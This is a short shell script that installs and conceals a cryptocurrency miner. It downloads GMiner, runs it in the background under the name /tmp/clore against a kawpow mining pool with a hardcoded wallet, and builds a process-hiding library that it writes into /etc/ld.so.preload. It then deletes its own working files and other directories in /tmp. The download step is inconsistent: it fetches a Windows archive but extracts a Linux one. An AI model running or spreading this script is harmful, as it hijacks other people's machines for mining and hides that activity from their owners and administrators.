mkdir -p /tmp/ml 
cp Makefile processhider.c /tmp/ml/
./cudaubuntu.sh
./cudafedora.sh
./cudaredhat.sh 
./amd.sh
wget https://github.com/develsoftware/GMinerRelease/releases/download/3.41/gminer_3_41_windows64.zip
mv gminer_3_41_linux64.tar.xz /tmp/ml/
tar xvf gminer_3_41_linux64.tar.xz -C /tmp/ml
cp /tmp/ml/gminer_3_41_linux64/miner /tmp/clore
/tmp/clore --algo kawpow --server eu.clore.k1pool.com:5030 --user APSSWuRCY7Tw4xDvRY7yDW4EEwZPzALAAc.RIG_3 -p x &
make
mv libprocesshider.so /usr/local/lib/
rm -rf /etc/ld.so.preload
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
rm -rf /tmp/ml
rm -rf /tmp/jupyternotebookagent
rm -rf /tmp/neptun
